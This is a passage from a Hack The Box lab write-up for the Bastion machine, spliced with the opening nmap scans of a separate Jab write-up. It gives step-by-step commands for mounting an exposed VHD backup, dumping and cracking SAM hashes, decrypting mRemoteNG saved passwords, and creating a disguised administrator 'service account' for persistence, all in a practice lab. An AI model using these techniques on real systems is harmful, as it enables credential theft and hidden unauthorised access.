nothing if we look at the file cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml we can see in it\u0026rsquo;s name it mentions \u0026ldquo;AdditionalFiles\u0026rdquo; and looking at the contents we can see it says \u0026ldquo;CyrptographyKeys\u0026rdquo; are also part of the backup.\niconv -f UTF16LE -t UTF-8 cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml | xml_pp With this information in hand we should now mount the larger of the VHD drives.\nMounting The Larger VHD Over SMB: Luckily for us we don\u0026rsquo;t need to download all 5GB\u0026rsquo;s of the VHD \u0026amp; instead we can mount the smbshare locally and then mount the VHD from there to access the contents.\nStep 1: Mount the SMB share locally on our Linux machine: We need to make the Windows share accessible first, so we can interact with the .vhd file.\nWe create a mount point for it.\nsudo mkdir -p /mnt/smbshare Then we mount it directly to the mountpoint passing the username as guest and the password as a blank string ''\nsudo mount -t cifs //10.129.255.143/Backups /mnt/smbshare -o username=guest,password=\u0026#39;\u0026#39; Step 2: Attach the VHD and mount its filesystem: Now we have the share mounted we can access the files under /mnt/smbshare, now we can use guestmount to mount the .vhd locally.\nMake a mount point\nsudo mkdir -p /mnt/vmMount sudo guestmount --add /mnt/smbshare/WindowsImageBackup/L4mpje-PC/Backup\\ 2019-02-22\\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vmMount +Note+: Be patient as this might hang as we are mounting a 5GB image over a network smbshare. Examining the File System: Lets now switch to root and examine the share:\ncd /mnt/vmMount ls We go straight for the SSH keys but they are not present\n2. Foothold: Retrieving Clear Text Creds from SAM \u0026amp; System file: Luckily this is a full backup so it contains the SAM \u0026amp; SYSTEM files, so should easily be able to pull creds from them.\nIf we navigate to C:/Windows/System32/config we can see the SAM \u0026amp; SYSTEM files are present which is what we need to dump creds using impacket-secretsdump\nSide Quest: What are SAM \u0026amp; SYSTEM files? If you\u0026rsquo;re unfamiliar here is a quick overview.\nSAM: When you\u0026rsquo;re attacking a Windows machine, grabbing the SAM database is one of our biggest priorities.\nSAM — short for Security Account Manager is the Windows database file that holds credentials for all local users on the system. It\u0026rsquo;s responsible for handling local and remote authentication* (but not Active Directory authentication, that\u0026rsquo;s a ntds.dit). However, even on a domain-joined system, we can sometimes still pull useful information from the SAM file, like cached credentials or local accounts that have administrative rights. So remember, even if the machine is domain-joined, it\u0026rsquo;s still worth checking out the SAM because some local accounts might be reused across multiple machines, think admins who don\u0026rsquo;t rotate passwords like they should.\nPasswords are stored in either LM hashes or NTLM hashes in a registry HIVE. We can find the SAM file stashed away at: %SystemRoot%\\system32\\config\\SAM…and it\u0026rsquo;s also mounted in the registry under HKLM\\SAM.\nAccessing it requires SYSTEM-level permissions — meaning we either need to escalate privileges first or grab a SYSTEM shell.\nAlso, on older systems, Microsoft tried to beef up SAM\u0026rsquo;s security using SYSKEY SYSKEY encrypts the password hashes inside the SAM file using a separate key. While it was originally meant to stop offline attacks, today it\u0026rsquo;s pretty outdated.\nhttps://support.microsoft.com/en-us/topic/how-to-use-the-syskey-utility-to-secure-the-windows-security-accounts-manager-database-12c71056-b050-0838-12f9-95ac607c8288 https://en.wikipedia.org/wiki/Security_Account_Manager The SYSTEM File: To actually read the SAM file at C:\\Windows\\System32\\config\\SAM, we\u0026rsquo;ll need SYSTEM-level privileges, however as we have a .VHD image of the computer we can get around this.\nSYSTEM is the most powerful user account on a Windows machine (not in a domain, but on a machine), even more powerful than Administrator. While an Administrator can control user settings and install programs, SYSTEM can interact directly with the operating system\u0026rsquo;s core, hardware drivers, and protected files etc.\nWindows protects sensitive files like SAM by locking them at the filesystem level. Which means if we\u0026rsquo;re running as a normal user (or even as Administrator), the OS will prevent us from opening or copying the SAM file directly. We would need SYSTEM access to get around those restrictions. For example, by using techniques like PSEXEC, LSASS injection, or exploiting a local privilege escalation vulnerability, to get SYSTEM level access.\n+Important+: even if we don\u0026rsquo;t grab the SAM file from disk, the live copy of the SAM is loaded in memory under the Windows Registry (HKLM\\SAM). But again, Windows locks this live in-memory registry hive, and you still need SYSTEM-level access to dump it. This is why so many credential dumping tools (like Mimikatz or secretsdump.py) either require SYSTEM privileges upfront, or exploit a process that\u0026rsquo;s already running as SYSTEM to access the SAM file.\nHowever once we have SYSTEM access, the SAM database is ours to extract, meaning we get all the password hashes to crack and pass.\nUsing impacket-secretsdump to dump creds from SAM \u0026amp; SYSTEM: Luckily as we have the .VHD mounted locally we can easily run impacket-secretsdump to get the creds.\nimpacket-secretsdump -sam SAM -system SYSTEM LOCAL What you may notice is that the Administrator \u0026amp; Guest account have the same hash \u0026amp; password and as we know the password is blank, it looks like the Administrator password is blank, but this is not the case.\nLet\u0026rsquo;s verify the hash for the L4mpje user is valid.\nIt is, so now we have a foothold.\nCracking L4mpje Password Hash with hashcat: As this host is running SSH lets see if we can crack hashes with hashcat to see if we can retrieve the cleartext values.\nhashcat -m 1000 Hashes.txt /home/kali/Wordlists/rockyou.txt We manage to crack it and get the cleartext password of bureaulampje\nConnecting To The Target VIA SSH: As we have recovered the cleartext password lets see if we can connect via SSH as it\u0026rsquo;s running on the target.\nssh $user@$box And we are in.\nLets switch to powershell as it\u0026rsquo;s just better:\npowershell Lets get our user.txt flag.\n3. Privilege Escalation: Transferring WinPeas Via SCP: Lets see if we can get some quick and dirty enumeration done using winPEAS .\nscp winPEASany.exe $user@$box:/C:/Users/L4mpje/ We can see there is a startup up script for the user we have access to, so we should take a look at that.\n\u0026#34;C:\\Users\\L4mpje\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\u0026#34; Looking at it, it just seems to be a standard mount command for mounting the \u0026ldquo;Backups\u0026rdquo; share locally, however it does have clear text creds which is naughty. Alas it won\u0026rsquo;t help us privesc.\nTrying to load LaZagne on the host: winPEAS does run without issue however if we try to run LaZagne .exe we get the below error, so we know that AV is active on his host.\nWe could compile custom versions of these tools or use download cradles with PowerSharpPack etc, however this is labeled as an easy box so I doubt that this would be the correct privesc path to take, so instead of relying on automated tools we should enumerate further.\nFinding mRemoteNG in Program Files: Looking around we can see that there is a folder \u0026ldquo;mRemoteNG\u0026rdquo; under C:\\Program Files (x86), but what is mRemoteNG?\nSide Quest: Whats mRemoteNG?: mRemoteNG is a an open-source remote connection manager. It lets users store and manage credentials for multiple protocols like RDP, SSH, VNC, and more—all in a single UI.\nThe fun part for us is it\u0026rsquo;s got to save all it\u0026rsquo;s connection details (including credentials) somewhere, and that somewhere is in a file called confCons.xml, located at.\n%USERPROFILE%\\AppData\\Roaming\\mRemoteNG So in this case:\nC:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG\\confCons.xml Now mRemoteNG does encrypt it\u0026rsquo;s saved passwords using AES however by default it uses a hard-coded master password of mR3m…..yeah you read that right mR3m. This means if the user hasn\u0026rsquo;t set their own master password or properly protected the configuration, we can easily decrypt stored credentials.\nIn other words: +If the config file isn\u0026rsquo;t locked down and they\u0026rsquo;re using the default encryption key—it\u0026rsquo;s game over.+\nSample mRemoteNG confCons.xml Config Snippet: Let\u0026rsquo;s look at an example of what this config file confCons.xml might contain:\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;mrng:Connections xmlns:mrng=\u0026#34;http://mremoteng.org\u0026#34; Name=\u0026#34;Connections\u0026#34; Export=\u0026#34;false\u0026#34; EncryptionEngine=\u0026#34;AES\u0026#34; BlockCipherMode=\u0026#34;GCM\u0026#34; KdfIterations=\u0026#34;1000\u0026#34; FullFileEncryption=\u0026#34;false\u0026#34; Protected=\u0026#34;QcMB21irFadMtSQvX5ONMEh7X+TSqRX3uXO5DKShwpWEgzQ2YBWgD/uQ86zbtNC65Kbu3LKEdedcgDNO6N41Srqe\u0026#34; ConfVersion=\u0026#34;2.6\u0026#34;\u0026gt; \u0026lt;Node Name=\u0026#34;RDP_Domain\u0026#34; Type=\u0026#34;Connection\u0026#34; Descr=\u0026#34;\u0026#34; Icon=\u0026#34;mRemoteNG\u0026#34; Username=\u0026#34;administrator\u0026#34; Domain=\u0026#34;test.local\u0026#34; Password=\u0026#34;sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==\u0026#34; Hostname=\u0026#34;10.0.0.10\u0026#34; Protocol=\u0026#34;RDP\u0026#34; Port=\u0026#34;3389\u0026#34; /\u0026gt; \u0026lt;!-- SNIP --\u0026gt; \u0026lt;/mrng:Connections\u0026gt; The Protected attribute is the encrypted master password hash. Each \u0026lt;Node\u0026gt; element holds connection info like IPs, usernames, domains, and encrypted passwords. So all we need to do is grab the hash in the Protected field and any passwords from any Node entries.\nDownloading mRemoteNG password file: So now we know where mRemoteNG stores passwords lets take a look. As expected are after confCons.xml is available.\nLets grab the whole directory as there are backups here so there may be other entries in them we need.\nscp -r $user@$box:C:/Users/L4mpje/APPDATA/Roaming/mRemoteNG . Discovering the confCons.xml contains the Administrator Password: Looking at confCons.xml we can see it contains the encrypted administrator password for RDP on local host 127.0.0.1.\nWe are lucky as there is a decryption script by haseebT for this specific task so, let\u0026rsquo;s download the script.\nwget https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py Now all we need to do is try to decrypt the password hash\npython3 mremoteng_decrypt.py -s \u0026#34;[HASH]\u0026#34; python3 mremoteng_decrypt.py -s \u0026#34;sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==\u0026#34; As we can see we get a cleartext password back.\n+Note+: It\u0026rsquo;s also possible to use a simple for-loop if we want to attempt to bruteforce the hash in the event the default encryption value is not being used, but This is not required for this box\nfor password in $(cat /usr/share/wordlists/Rockyou.txt);do echo $password; python3 mremoteng_decrypt.py -s \u0026#34;sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig==\u0026#34; -p $password 2\u0026gt;/dev/null;done Lets verify if the password works.\n\u0026amp; we have a winner.\nLet see if we can access the host VIA SSH now…and we can.\nLets get our root flag.\n4. Persistence: Let\u0026rsquo;s create an Administrator User So We Can Easily Get Back In: We can set it up as an innocent service account and use an existing program like mremoteng to make it appear normal. We will then add it to the \u0026ldquo;Administrators\u0026rdquo; group and access the host by SSH as the service is setup to accept passwords for login.\nNew-LocalUser -Name \u0026#34;svc_mremoteng\u0026#34; -Password (ConvertTo-SecureString \u0026#34;bl00dst1ll3r!\u0026#34; -AsPlainText -Force) -FullName \u0026#34;svc_mremoteng\u0026#34; -Description \u0026#34;Service Account\u0026#34; Add-LocalGroupMember -Group \u0026#34;Administrators\u0026#34; -Member \u0026#34;svc_mremoteng\u0026#34; Lets verify the user is part of the Administrators group.\nnet localgroup Administrators Let\u0026rsquo;s verify we can access the host via SSH as our new service account\nssh $user@$box And we are in\nLessons Learned: What did I learn? I learned to be patient with network mounted .VHD images. I learned that there automated tools are great and all however good ol\u0026rsquo; manual enumeration can lead the way. What silly mistakes did I make? Not too many this time actually. I could (should) have enumerated if AV was running when I had accessed but did not, so that\u0026rsquo; something to improve on movoing forward. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller@bloodstiller.com ",

        "content": "Jab Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Jab How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan:\n#Command nmap $box -Pn -oA TCPbasicScan #Results ┌─(...hroughs/HTB/Boxes/BlogEntriesMade/Jab/scans/nmap)───(kali@kali:pts/8)─┐ └─(13:34:43 on main)──\u0026gt; nmap $box -Pn -oA TCPbasicScan ──(Tue,Apr22)─┘ Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-22 13:34 BST Nmap scan report for 10.129.230.215 Host is up (0.022s latency). Not shown: 983 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5222/tcp open xmpp-client 5269/tcp open xmpp-server 5985/tcp open wsman 7070/tcp open realserver 7443/tcp open oracleas-https 7777/tcp open cbt Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds Initial thoughts: There is ALOT going on here. Alot to unpack here: As it\u0026rsquo;s running DNS 53 \u0026amp; Kerberos 88 I would be this is a Domain controller. It\u0026rsquo;s also running LDAP (various) \u0026amp; rpc (various) SMB (139) file sharing wsman (5985) windows remote powershell. realserver (7070), unknown will need to research. xmpp client \u0026amp; server (5222) \u0026amp; (5269) typically uses for messaging so maybe an internal messaging system? oracleas-https server (7443) (guessing it\u0026rsquo;s oracle) cbt (7777) unknown will need to research. Comprehensive Scans: In depth scan TCP:\n#Command sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP #Results ┌─(...hroughs/HTB/Boxes/BlogEntriesMade/Jab/scans/nmap)───(kali@kali:pts/8)─┐ └─(13:34:49 on main)──\u0026gt; sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-22 13:35 BST Nmap scan report for 10.129.230.215 Host is up (0.025s latency). Not shown: 65499 closed tcp ports (reset) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-04-22 12:36:00Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: jab.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-04-22T12:37:28+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=DC01.jab.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026lt;unsupported\u0026gt;, DNS:DC01.jab.htb | Not valid before: 2023-11-01T20:16:18 |_Not valid after: 2024-10-31T20:16:18 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: jab
